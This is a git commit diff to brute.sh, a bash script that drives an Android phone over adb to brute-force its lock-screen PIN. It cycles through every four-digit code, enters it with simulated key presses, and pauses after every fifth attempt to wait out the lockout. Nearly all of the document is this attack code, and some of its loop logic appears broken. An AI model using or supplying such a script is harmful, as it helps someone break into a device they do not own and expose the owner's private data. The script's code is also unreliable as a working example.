853c4f00ad92ac453e51b1f55183f8322234bcac
JebemtiMaiku <niki.iff@hotmail.com>
2023-07-03 18:13:45 +0200

    test

--- brute.sh
+++ brute.sh
@@ -13,22 +13,18 @@ adb shell input keyevent 82
 adb shell input swipe 407 1211 378 85
 while true
 do
-    for i in {0000..9999}
-    do
-        if [ [ $i != 1036 ] ]
-        then
+    for i in {0000..9999}; do
+        if [[ $i != 1036 ]]; then
             echo -e "\e[0;1mTrying pin:  $i\e[0m"
             while [ "$i" -le 4 ]
             do
-            for (( j=0; j<${#i}; j++ ))
-            do
+            for (( j=0; j<${#i}; j++ )); do
                 adb shell input keyevent $((`echo ${i:$j:1}`+7))
             done
             adb shell input keyevent 66
             adb shell input keyevent 3
             echo "home button"
-            if ! [ [ `expr $i + 1` % 5 ] ]
-            then
+            if ! (( `expr $i + 1` % 5 )); then
                 echo "now timeout"
                 adb shell input keyevent 66
                 sleep 30
